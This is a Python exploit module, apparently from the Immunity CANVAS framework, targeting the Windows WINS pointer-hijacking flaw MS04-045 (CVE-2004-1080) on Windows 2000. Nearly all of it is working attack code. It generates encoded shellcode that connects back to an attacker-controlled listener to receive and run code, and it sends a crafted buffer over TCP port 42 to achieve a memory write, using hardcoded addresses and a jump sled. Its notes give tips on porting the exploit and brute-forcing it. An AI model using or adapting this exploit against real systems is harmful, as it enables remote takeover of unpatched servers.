#! /usr/bin/env python
"""
INSTANTANEA: WINS (Windows NetBIOS Name server) Pointer Hijacking

"""
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("./exploits/recon/osdetect")
sys.path.append("../../exploits/recon/osdetect")
sys.path.append("./MOSDEF")
sys.path.append("../../MOSDEF")

from exploitutils import *
import addencoder
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit
import mosdef, time
import shellcodeGenerator
import canvasengine, mosdef
from canvasengine import socket_save_list

# GUI info
NAME="WINS Pointer hijacking exploit (MS04-045)"
DESCRIPTION="WINS Pointer hijacking exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['MSRC']="http://www.microsoft.com/technet/security/bulletin/MS04-045.mspx"
DOCUMENTATION["Date public"]="Not public/0day"
DOCUMENTATION["NOTE"]="Tested on Win2000 SP*"
DOCUMENTATION["References"]="Found by Nicolas Waisman of Immunity Inc."
DOCUMENTATION["CVE Name"] = "CVE-2004-1080"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1080"
DOCUMENTATION['CVSS'] = 10.0

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows", ] ]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV']="MS04-045"

GTK2_DIALOG="dialog.glade2"


CHANGELOG="""

"""

NOTES="""
To port this around ,search in memory for H*20 or something. That's your shellcode address.

On windows 2k3 ent you get CoE on 0x010157a4 which is a mov eax, [ecx+eax*4-4] where you control eax (myself)

It appears that there's a error handler that catches AV's and continues. This is great for brute forcing.


"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

targets = {
    0 : ["N/A", 0,0x0],    # this would be enough
    }



class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 42
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = ""
        self.myDCE = None
        self.name=NAME
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.remoteport = port
        sc = shellcodeGenerator.win32()
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("initstackswap", None)
        #sc.addAttr("stackSwap", None)
        self.shellcode = sc.get()
        encoder = chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log("Encoding shellcode")
        self.shellcode = encoder.encode(self.shellcode)
        if self.shellcode == "":
            self.log("Problem encoding shellcode")
            return 0
        return self.shellcode

    def test(self):
        # Every version is vulnerable at this moment :D
        self.port=self.argsDict["port"]
        self.host=self.target.interface

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

        try:
            s.connect( (self.host, self.port))
        except socket.error:
            return 0

        s.close()

        return 1


    def run(self):

        self.host=self.target.interface
        self.port=self.argsDict["port"]

        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)
        #self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        #self.s = self.gettcpsock()

        #           shellcode    stack     myself         SIZE
        #self.write4(0x05505000, 0x53DF4C4, 0x54E8000+0x20,0x40000)
        #self.write4(0x05505000, 0x53DF4C4, 0x54E8000+0x20,0x200000)
        #win2k
        self.write4(0x5700000, 0x53DF4C4, 0x5610000+0x20,0x250000)
        #windows 2003 ??
        #self.write4(0x3abdcd0, 0x372f400, 0x390000+0x20,0x250000)
        #self.log("Second try")
        time.sleep(2)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)
            return 1
        else:
            self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
            return 0

    def write4(self,what,  where, myself, size):
        self.s = self.gettcpsock() # socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        try:
            self.s.connect( (self.host, self.port))
        except:
            self.log("Could not connect")
            return 0

        # size DOES matter :>
        self.s.send(struct.pack("!L", size))

        buf  = ""
        buf += "AA" + chr(0xff) + "A"

        # Stupid Pointer that trigger Microsoft's bug (tm)
        buf += struct.pack("!L", myself)
        self.log("Guessing what: 0x%08x where: 0x%08x myself: 0x%08x with size: 0x%x" % (what,  where, myself, size))

        # WHERE - 0x48

        write4buf =""
        write4buf += struct.pack("<L", where-0x48)*9 # value must be -0x48
        # WHAT
        write4buf += struct.pack("<L", what) *13 # 16 bytes long

        #buf+= write4buf * (0x2E8*2)
        buf += write4buf * ( (size*5/8)/len(write4buf))

        jmp=mosdef.assemble("jmp $0x6B", "X86")
        buf += jmp * ( (size - len(buf) - len(self.shellcode)-0x6c) /len(jmp))
        buf += "H" * 0x6C +  "A" * ((size - len(buf) - len(self.shellcode)-0x6c) % len(jmp))
        buf += self.shellcode # SHELLCODE :>

        self.s.send(buf)


if __name__== '__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)

